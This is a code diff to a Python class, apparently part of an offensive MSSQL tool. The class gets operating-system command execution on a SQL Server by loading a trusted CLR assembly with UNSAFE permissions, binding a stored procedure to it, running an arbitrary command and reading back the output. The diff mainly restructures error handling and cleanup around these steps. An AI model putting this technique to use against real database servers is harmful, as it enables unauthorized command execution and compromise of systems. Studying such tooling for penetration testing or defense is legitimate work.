@@ -39,53 +39,49 @@ class CLREXEC:
         self.logger.debug(f"Trusting the assembly: {trust_query}")
         self.mssql_conn.sql_query(trust_query)
         if self.mssql_conn.lastError:
-            self.logger.error(f"Error trusting assembly: {self.mssql_conn.lastError}")
+            self.logger.fail(f"Error trusting assembly: {self.mssql_conn.lastError}")
             self._cleanup()
             self._restore_all()
             return ""
 
-        create_assembly_query = f"""
-        CREATE ASSEMBLY [{self.assembly_name}]
-            FROM {self.assembly_hex}
-            WITH PERMISSION_SET = UNSAFE;
-        """
-        self.logger.debug(f"Creating assembly: {create_assembly_query}")
-        self.mssql_conn.sql_query(create_assembly_query)
-        if self.mssql_conn.lastError:
-            self.logger.error(f"Error creating assembly: {self.mssql_conn.lastError}")
+        # This try/except is mandatory because we have to make sure what we added is deleted
+        # And I have had strange time out once, hence the need
+        try:
+            create_assembly_query = f"""
+            CREATE ASSEMBLY [{self.assembly_name}]
+                FROM {self.assembly_hex}
+                WITH PERMISSION_SET = UNSAFE;
+            """
+            self.logger.debug(f"Creating assembly: {create_assembly_query}")
+            self.mssql_conn.sql_query(create_assembly_query)
+            if self.mssql_conn.lastError:
+                self.logger.fail(f"Error creating assembly: {self.mssql_conn.lastError}")
+
+            create_proc_query = f"""
+            CREATE PROCEDURE [{self.procedure_name}] @cmd NVARCHAR(4000)
+                AS EXTERNAL NAME [{self.assembly_name}].[{self.classname}].[{self.method}];
+            """
+            self.logger.debug(f"Creating procedure: {create_proc_query}")
+            self.mssql_conn.sql_query(create_proc_query)
+            if self.mssql_conn.lastError:
+                self.logger.fail(f"Error creating procedure: {self.mssql_conn.lastError}")
+
+            exec_query = f"EXEC [{self.procedure_name}] @cmd = N'{command}';"
+            self.logger.debug(f"Executing: {exec_query}")
+            raw = self.mssql_conn.sql_query(exec_query)
+            if self.mssql_conn.lastError:
+                self.logger.fail(f"Error executing procedure: {self.mssql_conn.lastError}")
+
+            self.logger.debug(f"Raw results: {raw}")
+            output = ""
+            if raw and raw[0]:
+                first_val = next(iter(raw[0].values()))
+                output = first_val.decode("cp850").strip() if isinstance(first_val, bytes) else str(first_val).strip()
+        except Exception:
+            pass
+        finally:
             self._cleanup()
             self._restore_all()
-            return ""
-
-        create_proc_query = f"""
-        CREATE PROCEDURE [{self.procedure_name}] @cmd NVARCHAR(4000)
-            AS EXTERNAL NAME [{self.assembly_name}].[{self.classname}].[{self.method}];
-        """
-        self.logger.debug(f"Creating procedure: {create_proc_query}")
-        self.mssql_conn.sql_query(create_proc_query)
-        if self.mssql_conn.lastError:
-            self.logger.error(f"Error creating procedure: {self.mssql_conn.lastError}")
-            self._cleanup()
-            self._restore_all()
-            return ""
-
-        exec_query = f"EXEC [{self.procedure_name}] @cmd = N'{command}';"
-        self.logger.debug(f"Executing: {exec_query}")
-        raw = self.mssql_conn.sql_query(exec_query)
-        if self.mssql_conn.lastError:
-            self.logger.error(f"Error executing procedure: {self.mssql_conn.lastError}")
-            self._cleanup()
-            self._restore_all()
-            return ""
-
-        self.logger.debug(f"Raw results: {raw}")
-        output = ""
-        if raw and raw[0]:
-            first_val = list(raw[0].values())[0]
-            output = first_val.decode("cp850").strip() if isinstance(first_val, bytes) else str(first_val).strip()
-
-        self._cleanup()
-        self._restore_all()
         return output
 
     def _cleanup_stale(self):
